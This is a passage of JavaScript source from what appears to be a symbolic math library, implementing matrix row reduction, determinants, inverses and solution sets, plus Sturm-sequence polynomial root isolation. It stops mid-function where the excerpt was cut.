  Matrix.prototype.augment = function (b) { // ( this | m )  m.rows() ==== this.rows()
    if (this.rows() !== b.rows()) {
      throw new RangeError("NonSquareMatrixException");
    }
    var a = this;
    return Matrix.Zero(a.rows(), a.cols() + b.cols()).map(function (element, i, j) {
      return (j < a.cols() ? a.e(i, j) : b.e(i, j - a.cols()));
    });
  };

  Matrix.prototype.rowReduce = function (targetRow, pivotRow, pivotColumn, currentOrPreviousPivot) {
    if (currentOrPreviousPivot == undefined) {
      currentOrPreviousPivot = this.e(pivotRow, pivotColumn);
    }
    var rows = this.rows();
    var cols = this.cols();
    var c = new Array(rows);
    var i = -1;
    while (++i < rows) {
      var x = this.a[i];
      if (targetRow === i) {
        x = new Array(cols);
        var j = -1;
        while (++j < cols) {
          // (e_ij - e_ic * e_rj / e_rc) * (e_rc / cpp)
          var e = this.e(pivotRow, pivotColumn).multiply(this.e(targetRow, j)).subtract(this.e(targetRow, pivotColumn).multiply(this.e(pivotRow, j))).divide(currentOrPreviousPivot);
          x[j] = e.simplifyExpression();
        }
        c[i] = x;
      }
      c[i] = x;
    }
    return new Matrix(c);
  };

  Matrix.prototype.swapRows = function (pivotRow, targetRow, preserveDeterminant) {
    var m = this;
    return m.map(function (e, i, j) {
      if (i === pivotRow) {
        return m.e(targetRow, j);
      }
      if (i === targetRow) {
        return preserveDeterminant ? m.e(pivotRow, j).negate() : m.e(pivotRow, j);
      }
      return e;
    });
  };

  var notEqualsZero = function (e, condition) {//TODO: - ?
    if (condition != undefined) {
      //!update from 2018-16-07
      return condition.andZero(e).isFalse();
    }
    return !e.equals(Expression.ZERO);
  };

  Matrix.check = function (usage, matrix, from, to, condition) {
    for (var i = from; i < to; i += 1) {
      if (usage !== "solving" || notEqualsZero(matrix.e(i, matrix.cols() - 1), condition)) {
        var endColumnIndex = usage === "solving" ? matrix.cols() - 1 : (usage === "determinant" ? matrix.cols() : (usage === "inverse" ? Math.floor(matrix.cols() / 2) : -1));
        var j = 0;
        while (j < endColumnIndex && matrix.e(i, j).equals(Expression.ZERO)) {
          j += 1;
        }
        if (j === endColumnIndex) {
          return i;
        }
      }
    }
    return -1;
  };

  Matrix.toRowEchelonStep = function (m, pivotRow, pivotColumn, pivotOriginRow, previousPivot, options, condition) {
    var oldMatrix = undefined;
    var coefficient = undefined;
    var targetRow = 0;
    if (pivotOriginRow !== pivotRow) {
      oldMatrix = m;
      m = m.swapRows(pivotRow, pivotOriginRow, options.usage === "determinant");
      if (options.callback != undefined) {
        options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: options.usage === "determinant" ? "swap-negate" : "swap", targetRow: pivotRow, pivotRow: pivotOriginRow, pivotColumn: pivotColumn});
      }
    }
    // making zeros under the main diagonal
    if (options.method === Matrix.GaussJordan) {
      if (!m.e(pivotRow, pivotColumn).equals(Expression.ONE)) {
        oldMatrix = m;
        coefficient = Expression.ONE.divide(m.e(pivotRow, pivotColumn));
        m = m.map(function (e, i, j) {
          if (i !== pivotRow) {
            return e;
          }
          return e.multiply(coefficient);
        });
        if (options.callback != undefined) {
          options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "divide", targetRow: pivotRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
        }
      }
    }
    if (options.method === Matrix.Gauss || options.method === Matrix.GaussJordan) {
      targetRow = pivotRow;
      while (++targetRow < m.rows()) {
        if (!m.e(targetRow, pivotColumn).equals(Expression.ZERO)) {
          oldMatrix = m;
          m = m.rowReduce(targetRow, pivotRow, pivotColumn);
          if (options.callback != undefined) {
            options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "reduce", targetRow: targetRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
          }
          var stoppedAtRow = Matrix.check(options.usage, m, targetRow, targetRow + 1, condition);
          if (stoppedAtRow !== -1) {
            return {stoppedAtRow: stoppedAtRow, matrix: m};
          }
        }
      }
    }
    if (options.method === Matrix.GaussMontante) {
      oldMatrix = m;
      targetRow = -1;
      while (++targetRow < m.rows()) {
        if (targetRow !== pivotRow) {
          m = m.rowReduce(targetRow, pivotRow, pivotColumn, previousPivot);
        }
      }
      if (options.callback != undefined) {
        options.callback({previousPivot: previousPivot, newMatrix: m, oldMatrix: oldMatrix, type: "pivot", targetRow: -1, pivotRow: pivotRow, pivotColumn: pivotColumn});
      }
      var stoppedAtRow = Matrix.check(options.usage, m, 0, m.rows(), condition);
      if (stoppedAtRow !== -1) {
        return {stoppedAtRow: stoppedAtRow, matrix: m};
      }
    }
    return {stoppedAtRow: -1, matrix: m};
  };

  Matrix.toRowEchelonBackSubstitution = function (m, pivotRow, options) {
    // back-substitution
    if (options.method === Matrix.GaussJordan) {
      while (--pivotRow >= 0) {
        var pivotColumn = 0;
        while (pivotColumn < m.cols() && m.e(pivotRow, pivotColumn).equals(Expression.ZERO)) {
          pivotColumn += 1;
        }
        if (pivotColumn < m.cols()) {
          var targetRow = pivotRow;
          while (--targetRow >= 0) {
            if (!m.e(targetRow, pivotColumn).equals(Expression.ZERO)) {
              var oldMatrix = m;
              m = m.rowReduce(targetRow, pivotRow, pivotColumn);
              if (options.callback != undefined) {
                options.callback({previousPivot: undefined, newMatrix: m, oldMatrix: oldMatrix, type: "reduce", targetRow: targetRow, pivotRow: pivotRow, pivotColumn: pivotColumn});
              }
            }
          }
        }
      }
    }
    return m;
  };

  Matrix.Gauss = "Gauss";
  Matrix.GaussJordan = "Gauss-Jordan";
  Matrix.GaussMontante = "Gauss-Montante";

  function ToRowEchelonOptions(method, usage, callback) {
    if (usage !== "determinant" && usage !== "inverse" && usage !== "solving" && usage !== "LU-decomposition" && usage !== "" && usage !== "row-reduction") {
      throw new RangeError();
    }
    if (method !== Matrix.Gauss && method !== Matrix.GaussJordan && method !== Matrix.GaussMontante) {
      throw new RangeError();
    }
    this.method = method;
    this.usage = usage;
    this.callback = callback;
  }

  Matrix.ToRowEchelonOptions = ToRowEchelonOptions;

  // method === Matrix.GaussJordan - make zeros under diagonal and divide by pivot element, also swap row instead of addition
  // method === Matrix.Montante - https://es.wikipedia.org/wiki/M%C3%A9todo_Montante
  // private
  var COLUMN_LOOP = 0;
  var ZERO = 1;
  var NOT_ZERO = 2;
  Matrix.prototype.toRowEchelon = function (method, usage, callback) {
    var options = new Matrix.ToRowEchelonOptions(method, usage, callback);
    return this.toRowEchelonInternal(options, 0, -1, -1, Expression.ONE, COLUMN_LOOP, undefined);
  };
  Matrix.prototype.toRowEchelonXXX = function (method, usage, callback, condition) {
    var options = new Matrix.ToRowEchelonOptions(method, usage, callback);
    return this.toRowEchelonInternal(options, 0, -1, -1, Expression.ONE, COLUMN_LOOP, condition);
  };
  Matrix.prototype.toRowEchelonInternal = function (options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, state, condition) {
    var matrix = this;

    //2018-09-29
    if (condition != undefined && !condition.isTrue()) {
      matrix = matrix.map(function (e, i, j) {
        return condition.andNotZero(e).isFalse() ? Expression.ZERO : e;
      });
    }

    var stoppedAtRow = Matrix.check(options.usage, matrix, 0, matrix.rows(), condition);
    if (stoppedAtRow !== -1) {
      return {stoppedAtRow: stoppedAtRow, matrix: matrix, condition: condition};
    }
    if (false) {
      //TODO: remove
    //!2018-16-07 (from trash)
    if (options.usage === "solving" && pivotColumn === matrix.cols() - 1) {
      //TODO: test
      //TODO: test if condition == undefined
      var c = condition.andZero(matrix.e(pivotRow, pivotColumn));
      return {stoppedAtRow: -1, matrix: matrix, condition: c};
    }
    //!
    }
    while (true) {
      switch (state) {
        case COLUMN_LOOP:
          pivotColumn += 1;
          if (pivotColumn >= matrix.cols()) {
            matrix = Matrix.toRowEchelonBackSubstitution(matrix, pivotRow, options);
            return {stoppedAtRow: -1, matrix: matrix, condition: condition};
          }
          if (pivotColumn > pivotRow && (options.usage === "determinant" || options.usage === "inverse")) {
            if (pivotColumn >= Math.floor(matrix.cols() / 2) && options.usage === "inverse") {//TODO: fix
              matrix = Matrix.toRowEchelonBackSubstitution(matrix, pivotRow, options);
              return {stoppedAtRow: -1, matrix: matrix, condition: condition};
            }
            return {stoppedAtRow: pivotRow, matrix: matrix, condition: condition};//? TODO: details - ?
          }
          pivotOriginRow = pivotRow - 1;
          state = ZERO;
        break;
        case ZERO:
          // pivot searching
          // not zero element in a column (starting from the main diagonal);
          if (condition == undefined) {
            pivotOriginRow += 1;
            if (pivotOriginRow < matrix.rows()) {
              if (matrix.e(pivotOriginRow, pivotColumn).equals(Expression.ZERO)) {
                state = ZERO;
              } else {
                state = NOT_ZERO;
              }
            } else {
              state = COLUMN_LOOP;
            }
          } else {
            if (pivotOriginRow >= pivotRow) {
              matrix = pivotRow >= matrix.rows() || matrix.e(pivotRow, pivotColumn).equals(Expression.ZERO) ? matrix : matrix.map(function (e, i, j) { //?
                return i === pivotOriginRow && j === pivotColumn ? Expression.ZERO : (condition.andNotZero(e).isFalse() ? Expression.ZERO : e);
              });
            }
            var found = false;
            if (pivotOriginRow === pivotRow - 1) {//!
              var row = pivotRow;
              while (row < matrix.rows() && !((condition.andZero(matrix.e(row, pivotColumn)).isFalse() || options.usage === "LU-decomposition") && !matrix.e(row, pivotColumn).equals(Expression.ZERO))) {
                row += 1;
              }
              if (row < matrix.rows()) {
                pivotOriginRow = row;
                found = true;
              }
            }//!
            if (!found) {
              pivotOriginRow += 1;
              if (pivotOriginRow < matrix.rows()) {
                var candidate = matrix.e(pivotOriginRow, pivotColumn);
                var c1 = condition.andNotZero(candidate);
                var c2 = condition.andZero(candidate);
                if (c2.isFalse()) {
                  state = NOT_ZERO;
                } else if (c1.isFalse()) {
                  state = ZERO;
                } else {
                  if (options.usage === "row-reduction") {
                    var tmp = Matrix.toRowEchelonStep(matrix, pivotRow, pivotColumn, pivotOriginRow, previousPivot, Object.assign({}, options, {callback: null}), condition);
                    var m = tmp.matrix.slice(pivotOriginRow + 1, matrix.rows(), pivotColumn, matrix.cols()).map(function (e, i, j) {
                      return c2.andNotZero(e).isFalse() ? Expression.ZERO : e;
                    });
                    if (m.eql(Matrix.Zero(m.rows(), m.cols()))) {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, NOT_ZERO, condition);
                    }
                  }
                  return {
                    matrix: matrix,
                    c1: c1,
                    a1: function () {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, NOT_ZERO, c1);
                    },
                    c2: c2,
                    a2: function () {
                      return matrix.toRowEchelonInternal(options, pivotRow, pivotColumn, pivotOriginRow, previousPivot, ZERO, c2);
                    }
                  };
                }
              } else {
                state = COLUMN_LOOP;
              }
            } else {
              state = NOT_ZERO;
            }
          }
        break;
        case NOT_ZERO:
          var tmp = Matrix.toRowEchelonStep(matrix, pivotRow, pivotColumn, pivotOriginRow, previousPivot, options, condition);
          var stoppedAtRow = tmp.stoppedAtRow;
          matrix = tmp.matrix;
          if (stoppedAtRow !== -1) {
            return {stoppedAtRow: stoppedAtRow, matrix: matrix, condition: condition};
          }
          previousPivot = matrix.e(pivotRow, pivotColumn);
          pivotRow += 1;
          state = COLUMN_LOOP;
        break;
      }
    }
  };

  Matrix.prototype.determinant = function () { // m == n  // via row echelon form
    var n = this.rows();
    if (!this.isSquare() || n === 0) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (false) {
      var tmp = this.toRowEchelon(Matrix.Gauss, "determinant", undefined);
      var stoppedAtRow = tmp.stoppedAtRow;
      var rowEchelonMatrix = tmp.matrix;
      if (stoppedAtRow !== -1) {
        return Expression.ZERO;
      }
      var det = rowEchelonMatrix.e(0, 0);
      for (var j = 1; j < rowEchelonMatrix.rows(); j += 1) {
        det = det.multiply(rowEchelonMatrix.e(j, j));
      }
      return det;
    }
    var tmp = this.toRowEchelon(Matrix.GaussMontante, "determinant", undefined);
    var stoppedAtRow = tmp.stoppedAtRow;
    var rowEchelonMatrix = tmp.matrix;
    if (stoppedAtRow !== -1) {
      return Expression.ZERO;
    }
    return rowEchelonMatrix.e(n - 1, n - 1);
  };

  Matrix.prototype.rank = function () {
    // rank === count of non-zero rows after bringing to row echelon form ...
    //var m = this.toRowEchelon(Matrix.Gauss, "", undefined).matrix;
    var m = this.toRowEchelon(Matrix.GaussMontante, "", undefined).matrix;
    var result = 0;
    var pivotRow = 0;
    var pivotColumn = 0;
    while (pivotRow < m.rows()) {
      while (pivotColumn < m.cols() && m.e(pivotRow, pivotColumn).equals(Expression.ZERO)) {
        pivotColumn += 1;
      }
      if (pivotColumn < m.cols()) {
        result += 1;
      }
      pivotRow += 1;
    }
    return result;
  };

  Matrix.prototype.inverse = function () { // m == n by augmention ...
    if (!this.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }
    if (this.rows() === 2) {
      var a = this.e(0, 0);
      var b = this.e(0, 1);
      var c = this.e(1, 0);
      var d = this.e(1, 1);
      var det = a.multiply(d).subtract(b.multiply(c));
      if (det.equals(Expression.ZERO)) {
        throw new RangeError("SingularMatrixException");
      }
      return Matrix.Zero(this.rows(), this.rows()).map(function (e, i, j) {
        return (i === 0 ? (j === 0 ? d : b.negate()) : (j === 0 ? c.negate() : a)).divide(det);
      });
    }
    var m = this.augment(Matrix.I(this.rows()));
    //m = m.toRowEchelon(Matrix.GaussJordan, "inverse", undefined).matrix;
    m = m.toRowEchelon(Matrix.GaussMontante, "inverse", undefined).matrix;

    return Matrix.Zero(m.rows(), m.rows()).map(function (element, i, j) { // splitting to get the second half
      var e = m.e(i, i);
      if (e.equals(Expression.ZERO)) {
        throw new RangeError("SingularMatrixException");
      }
      var x = m.e(i, j + m.rows());
      return e.equals(Expression.ONE) ? x : x.divide(e);
    });
  };

  Matrix.prototype.toString = function (options) {
    var result = "";
    var rows = this.rows();
    var cols = this.cols();
    var j = -1;
    result += "{";
    while (++j < rows) {
      if (j !== 0) {
        result += ",";
      }
      result += "{";
      var i = -1;
      while (++i < cols) {
        if (i !== 0) {
          result += ",";
        }
        result += this.e(j, i).toString(options);
      }
      result += "}";
    }
    result += "}";
    return result;
  };

  Matrix.prototype.negate = function () {
    return this.map(function (element, i, j) {
      return element.negate();
    });
  };

  Matrix.prototype.subtract = function (b) {
    return this.add(b.negate());
  };

  //?
  // returns an array of arrays of strings
  Matrix.prototype.getElements = function () {
    var rows = this.rows();
    var cols = this.cols();
    var elements = new Array(rows);
    for (var i = 0; i < rows; i += 1) {
      var row = new Array(cols);
      for (var j = 0; j < cols; j += 1) {
        row[j] = this.e(i, j).toString();
      }
      elements[i] = row;
    }
    return elements;
  };

  Matrix.prototype.slice = function (rowsStart, rowsEnd, colsStart, colsEnd) {
    var that = this;
    return Matrix.Zero(rowsEnd - rowsStart, colsEnd - colsStart).map(function (e, i, j) {
      return that.e(i + rowsStart, j + colsStart);
    });
  };

  //TODO: 
  Matrix.prototype.isExact = function () {
    var rows = this.rows();
    var cols = this.cols();
    for (var i = 0; i < rows; i += 1) {
      for (var j = 0; j < cols; j += 1) {
        if (!this.e(i, j).isExact()) {
          return false;
        }
      }
    }
    return true;
  };

  Matrix.prototype.eql = function (b) {
    var a = this;
    if (a.rows() !== b.rows() || a.cols() !== b.cols()) {
      return false;
    }
    for (var i = 0; i < a.rows(); i += 1) {
      for (var j = 0; j < a.cols(); j += 1) {
        if (!a.e(i, j).equals(b.e(i, j))) {
          return false;
        }
      }
    }
    return true;
  };

  Matrix.prototype.pow = function (n) {
    if (n < 0) {
      throw new RangeError();
    }
    if (n > 9007199254740991) {
      throw new RangeError();
    }
    var pow = function (x, count, accumulator) {
      return (count < 1 ? accumulator : (2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x.multiply(x), Math.floor(count / 2), accumulator)));
    };
    return pow(this, n, Matrix.I(this.rows()));
  };

  /*
  // TODO: remove
  Matrix.prototype.stripZeroRows = function () {
    var rows = this.rows();
    var cols = this.cols();
    var i = rows;
    var j = cols;
    while (j === cols && --i >= 0) {
      j = 0;
      while (j < cols && this.e(i, j).equals(Expression.ZERO)) {
        j += 1;
      }
    }
    i += 1;
    var that = this;
    return i === rows ? this : Matrix.Zero(i, cols).map(function (e, i, j) {
      return that.e(i, j);
    });
  };
  */

  // string -> array of array of strings, find `extraPositionOffset`
  Matrix.split = function (input) {
    var result = [];
    var m = input;
    if (/^\s*\[[^\[\]]*\]\s*$/.exec(m) != undefined) {//!
      m = m.replace(/\[/g, " ");
      m = m.replace(/\]/g, " ");
    }//!
    if (m.replace(/^\s+|\s+$/g, "") !== "") {
      m = m.replace(/;/g, "\n");//? ; -> \n
      m = m.replace(/\r/g, "\n");
      var row = [];
      result.push(row);
      var position = 0;
      var match = undefined;
      while ((match = /^\s*\S+/.exec(m.slice(position))) != undefined) {
        var t = match[0];
        if (t.indexOf("\n") !== -1 && row.length !== 0) {
          row = [];
          result.push(row);
          t = t.replace(/\n/g, " ");
        }
        row.push(t);
        position += t.length;
      }
    }
    return result;
  };

  Matrix.padRows = function (array, convertFunction) {
    var rows = array.length;
    var cols = 0;
    for (var k = 0; k < rows; k += 1) {
      var length = array[k].length;
      if (cols < length) {
        cols = length;
      }
    }
    var data = new Array(rows);
    for (var i = 0; i < rows; i += 1) {
      var y = array[i];
      var x = new Array(cols);
      for (var j = 0; j < cols; j += 1) {
        x[j] = j < y.length ? (convertFunction != null ? convertFunction(y[j]) : y[j]) : Expression.ZERO;
      }
      data[i] = x;
    }
    return new Matrix(data);
  };

  Matrix.solveByGaussNext = function (m, callback) {
    var pivotRows = new Array(m.cols() - 1);
    for (var k = 0; k < m.cols() - 1; k += 1) {
      pivotRows[k] = -1;
    }
    for (var i = m.rows() - 1; i >= 0; i -= 1) {
      var j = 0;
      while (j < m.cols() - 1 && m.e(i, j).equals(Expression.ZERO)) {
        j += 1;
      }
      // first not zero in a row - main variable
      if (j < m.cols() - 1) {
        pivotRows[j] = i;
        var oldMatrix1 = m;
        // reduce i-th row
        for (var k = j + 1; k < m.cols() - 1; k += 1) {
          if (!m.e(i, k).equals(Expression.ZERO)) {
            var pivotRow = pivotRows[k];
            if (pivotRow !== -1) {
              m = m.rowReduce(i, pivotRow, k);
            }
          }
        }
        var oldMatrix2 = m;
        // divide i-th row by m.e(i, j)
        if (!m.e(i, j).equals(Expression.ONE)) {
          var c = m.e(i, j);
          m = m.map(function (e, row, column) {
            return row === i ? e.divide(c) : e;
          });
        }
        if (callback != undefined) {
          callback(m, oldMatrix1, oldMatrix2, i, j);
        }
      }
    }
    return m;
  };

  //TODO: ?
  Matrix.getPivotRow = function (m, k) {
    var i = m.rows() - 1;
    while (i >= 0 && m.e(i, k).equals(Expression.ZERO)) {
      i -= 1;
    }
    if (i >= 0) {
      var j = k - 1;
      while (j >= 0 && m.e(i, j).equals(Expression.ZERO)) {
        j -= 1;
      }
      if (j < 0) {
        return i;
      }
    }
    return -1;
  };

  //TODO: fix
  Matrix.getSolutionSet = function (m) {
    var result = {
      basisVectors: [],
      variables: []
    };
    for (var k = 0; k < m.cols() - 1; k += 1) {
      if (Matrix.getPivotRow(m, k) === -1) {
        // a basis vector for k-th variable
        var bx = new Array(m.cols() - 1);
        for (var j = 0; j < m.cols() - 1; j += 1) {
          var i = Matrix.getPivotRow(m, j); // a solution row for j-th variable, -1 if it is a free variable
          bx[j] = i !== -1 ? m.e(i, k).negate() : (j === k ? Expression.ONE : Expression.ZERO);
        }
        var matrixData = new Array(1);
        matrixData[0] = bx;
        var basisVector = new Matrix(matrixData).transpose();
        result.basisVectors.push(basisVector);
        result.variables.push(k);
      }
    }
    return result;
  };

  Matrix.prototype.minorMatrix = function (k, l) {
    var that = this;
    return Matrix.Zero(this.rows() - 1, this.cols() - 1).map(function (e, i, j) {
      return that.e(i < k ? i : i + 1, j < l ? j : j + 1);
    });
  };

  Matrix.toRowEchelonWithCallback = function (matrix, method, usage, changeCallback, resultCallback) {
    var result = matrix.toRowEchelonXXX(method, usage, changeCallback, Condition.TRUE);
    var w = function (result) {
      if (result.c1 == undefined && result.c2 == undefined) {
        resultCallback(result);
      } else {
        w(result.a1());
        w(result.a2());
      }
    };
    w(result);
  };

  self.Matrix = Matrix;

})();
(function () {
"use strict";




function PolynomialRoot(polynomial, interval) {
  Expression.Symbol.call(this, "@");
  this.polynomial = polynomial;
  this.interval = interval;
}
PolynomialRoot.prototype = Object.create(Expression.Symbol.prototype);

Expression.PolynomialRoot = PolynomialRoot;





function ExpressionWithPolynomialRoot(e, root) {
  this.e = e; // internal symbolic expression with a "root" as a symbol
  this.root = root;
}

function makeExpressionWithPolynomialRoot(e, root) {
  //TODO: use cases - ?
  if (e instanceof Expression.Integer) {
    return e;
  }
  if (e instanceof Expression.Division && e.a instanceof Expression.Integer && e.b instanceof Expression.Integer) {
    return e;
  }
  //!

  var en = e.getNumerator();
  if (en.equals(Expression.ZERO)) {
    return Expression.ZERO;
  }
  var v = root;
  //TODO: use polynomial from the start - ?
  var f = Polynomial.toPolynomial(en, v);
  if (f.hasRoot(v)) {
    return Expression.ZERO;
  }
  var c = function (x) {
    return Polynomial.toPolynomial(x, v).divideAndRemainder(v.polynomial).remainder.calcAt(v);
  };
  e = c(e.getNumerator()).divide(c(e.getDenominator()));
  if (e instanceof Expression.Integer) {
    return e;
  }
  if (e instanceof Expression.Division && e.a instanceof Expression.Integer && e.b instanceof Expression.Integer) {
    return e;
  }

  return new ExpressionWithPolynomialRoot(e, root);
}

ExpressionWithPolynomialRoot.prototype = Object.create(Expression.Symbol.prototype);

//Expression.prototype.isExact = function () {
//  return true;
//};
ExpressionWithPolynomialRoot.prototype.isExact = function () {
  //TODO: fix - ?
  return false;
};

ExpressionWithPolynomialRoot.prototype.negate = function () {
  return makeExpressionWithPolynomialRoot(this.e.negate(), this.root);
};
ExpressionWithPolynomialRoot.prototype.equals = function (other) {
  // optimization
  var s = other instanceof Expression.Integer && other.equals(Expression.ZERO) ? this : this.subtract(other);
  return s instanceof ExpressionWithPolynomialRoot ? false : s.equals(Expression.ZERO);
};
ExpressionWithPolynomialRoot.prototype.simplifyExpression = function () {
  return this;
};

ExpressionWithPolynomialRoot.prototype.toString = function (options) {
  options = options || {};
  //TODO:
  if (this.equals(Expression.ZERO)) {
    return Expression.ZERO.toString(options);
  }
  //return this.e.toString(options);
  var tmp = toDecimalStringInternal(this.e, options.fractionDigits !== -1 && options.fractionDigits != null ? options.fractionDigits : 3, undefined, undefined);
  return tmp;
};

ExpressionWithPolynomialRoot.prototype.toMathML = function (options) {
  //TODO: remove
  var decimalToMathML = function (sign, number) {
    return (sign < 0 ? "<mrow>" : "") + (sign < 0 ? "<mo>&minus;</mo>" : "") + "<mn>" + number + "</mn>" + (sign < 0 ? "</mrow>" : "");
  };
  var complexToMathML = function (real, imaginary) {
    return '<mrow>' + real + (imaginary.indexOf('<mo>&minus;</mo>') !== -1 ? '<mo>&minus;</mo>' : '<mo>+</mo>') + (imaginary !== '' ? imaginary.replace(/<mrow><mo>&minus;<\/mo><mn>([^<]*)<\/mn><\/mrow>/g, '<mn>$1</mn>') + '<mo>&it;</mo>' : '') + '<mi>&ii;</mi>' + '</mrow>';
  };

  //TODO:
  if (this.equals(Expression.ZERO)) {
    return Expression.ZERO.toMathML(options);
  }
  //return this.e.toMathML(options);
  var tmp = toDecimalStringInternal(this.e, options != null && options.fractionDigits !== -1 && options.fractionDigits != null ? options.fractionDigits : 3, decimalToMathML, complexToMathML);
  return tmp;
};

ExpressionWithPolynomialRoot.prototype.multiply = function (other) {
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root) {
      throw new RangeError("NotSupportedError");
    }
    return this.multiply(other.e);
  }
  return makeExpressionWithPolynomialRoot(this.e.multiply(other), this.root);
};
ExpressionWithPolynomialRoot.prototype.divide = function (other) {
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root) {
      throw new RangeError("NotSupportedError");
    }
    return this.divide(other.e);
  }
  return makeExpressionWithPolynomialRoot(this.e.divide(other), this.root);
};
ExpressionWithPolynomialRoot.prototype.add = function (other) {
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root) {
      throw new RangeError("NotSupportedError");
    }
    return this.add(other.e);
  }
  return makeExpressionWithPolynomialRoot(this.e.add(other), this.root);
};

ExpressionWithPolynomialRoot.prototype.divideExpression = function (other) {
  return makeExpressionWithPolynomialRoot(other.divide(this.e), this.root);
};
ExpressionWithPolynomialRoot.prototype.multiplyExpression = function (other) {
  return makeExpressionWithPolynomialRoot(other.multiply(this.e), this.root);
};
ExpressionWithPolynomialRoot.prototype.addExpression = function (other) {
  return makeExpressionWithPolynomialRoot(other.add(this.e), this.root);
};

ExpressionWithPolynomialRoot.prototype.getPrecedence = function () {
  return 1000;
};
ExpressionWithPolynomialRoot.prototype.isRightToLeftAssociative = function () {
  return true;
};
ExpressionWithPolynomialRoot.prototype.isUnaryPlusMinus = function () {
  return true;
};


  // https://math.stackexchange.com/questions/309178/polynomial-root-finding
  function SturmSequence(f) {
    var d = f.derive();
    this.f = f;
    this.s = [];
    var fp = f;
    var fc = d;
    this.s.push(fp);
    this.s.push(fc);
    while (fc.getDegree() > 0) {
      var fn = fp.divideAndRemainder(fc).remainder.negate();
      if (fn.getDegree() >= 0) {
        var y = fn.getContent().inverse();
        if (y.isNegative()) {
          y = y.negate();
        }
        this.s.push(fn.scale(y));
        //?
        //this.s.push(fn);
      }
      fp = fc;
      fc = fn;
    }
  }

  SturmSequence.prototype.signChanges = function (x) {
    var result = 0;
    var sign = 0;
    for (var i = 0; i < this.s.length; i += 1) {
      var p = this.s[i];
      //var v = p.calcAt(x);
      //! 2018-10-15
      var v = Expression.ZERO;
      if (p.getDegree() >= 0) {
        var n = p.getDegree();
        var e = x.getDenominator();
        v = p.map(function (coefficient, degree) {
          return coefficient.multiply(Expression.pow(e, n - degree));
        }).calcAt(x.getNumerator());
      }
      //!
      var c = v.getNumerator().compareTo(Expression.ZERO);
      if (c !== 0) {
        if (sign === 0) {
          sign = c;
        } else {
          if (sign !== c) {
            sign = c;
            result += 1;
          }
        }
      }
    }
    return result;
  };

  SturmSequence.prototype.numberOfRoots = function (interval) {
    if (interval.a.equals(interval.b)) {
      throw new TypeError();
    }
    return this.signChanges(interval.a) - this.signChanges(interval.b);
  };

  SturmSequence.prototype.getRootIntervals = function () {
    var that = this;
    var interval = this.f.getRootsInterval();
    var getIntervals = function (interval) {
      var n = that.numberOfRoots(interval);
      if (n === 1) {
        return [interval];
      }
      if (n > 1) {
        var middle = interval.a.add(interval.b).divide(Expression.TWO);
        var a = getIntervals({a: interval.a, b: middle});
        var b = getIntervals({a: middle, b: interval.b});
        return a.concat(b);
      }
      return [];
    };
    return getIntervals(interval);
  };
  
  var abs = function (i) {
    return i.compareTo(Expression.ZERO) < 0 ? i.negate() : i;
  };
  
  Polynomial.prototype.getRootsInterval = function () {
    //TODO: only integer coefficients (?)
    // https://en.wikipedia.org/wiki/Sturm%27s_theorem#Number_of_real_roots
    var max = null;
    //TODO: fix the iteration
    for (var i = 0; i < this.getDegree(); i += 1) {
      var c = abs(this.getCoefficient(i));
      if (max == null || max.compareTo(c) < 0) {
        max = c;
      }
    }
    var M = Expression.ONE.add(max.divide(abs(this.getLeadingCoefficient())));
    return {a: M.negate(), b: M};
  };

  Polynomial.prototype.getZero = function (interval, precision) {
    var e = Expression.pow(Expression.TEN, precision); // epsilon^-1
    if (!(e instanceof Expression.Integer)) {
      throw new RangeError("epsilon^-1 is not an integer");
    }
    var a = interval.a;
    var b = interval.b;
    if (b.subtract(a).multiply(e).subtract(Expression.ONE).getNumerator().compareTo(Expression.ZERO) > 0) {
      //TODO:
      var tmp = true && precision >= 16 ? this.getZero(interval, Math.floor(precision / 4)) : interval;
      a = tmp.a;
      b = tmp.b;

      var n = this.getDegree();
      var p = this.map(function (coefficient, degree) {
        return coefficient.multiply(Expression.pow(e, n - degree));
      });
      var sa = a.getNumerator().multiply(e).truncatingDivide(a.getDenominator()).add(Expression.ONE);//?
      var sb = b.getNumerator().multiply(e).truncatingDivide(b.getDenominator());//?
      if (p.calcAt(sa).getNumerator().compareTo(Expression.ZERO) !== this.calcAt(a).getNumerator().compareTo(Expression.ZERO)) {
        return {a: a, b: sa.divide(e)};
      }
      if (p.calcAt(sb).getNumerator().compareTo(Expression.ZERO) !== this.calcAt(b).getNumerator().compareTo(Expression.ZERO)) {
        return {a: sb.divide(e), b: b};
      }
      a = sa;
      b = sb;
      // bisection method
      var pa = p.calcAt(a).getNumerator();
      var pb = p.calcAt(b).getNumerator();
      if (pa.compareTo(Expression.ZERO) === 0) {
        return {a: pa, b: pa};
      }
      if (pb.compareTo(Expression.ZERO) === 0) {
        return {a: pb, b: pb};
      }
      if (pa.compareTo(Expression.ZERO) === pb.compareTo(Expression.ZERO)) {
        throw new RangeError();//?
      }
      var cc = 0;
      var d = p.derive();
      while (b.subtract(a).compareTo(Expression.ONE) > 0) {// b - a > 1
        var middle = a.add(b).truncatingDivide(Expression.TWO);
        //console.log(eval(a.divide(e).toString()) + ' - ' + eval(b.divide(e).toString()));
        //?
        if (cc % 3 !== 2 && b.subtract(a).compareTo(e) < 0) {
          // TODO: better guesses
          // Newton's method
          var x = cc % 3 === 1 ? a : b;
          var c = d.calcAt(x);
          if (!c.equals(Expression.ZERO)) {
            x = x.multiply(c).subtract(p.calcAt(x)).truncatingDivide(c);
            if (x.compareTo(a) <= 0) {
              x = a.add(Expression.ONE);
            }
            if (x.compareTo(b) >= 0) {
              x = b.subtract(Expression.ONE);
            }
            //console.log("N: " + a + "  - " + x);
            middle = x;
          }
        }
        cc += 1;
        //?
        var v = p.calcAt(middle).getNumerator();
        if (v.compareTo(Expression.ZERO) === pb.compareTo(Expression.ZERO)) {
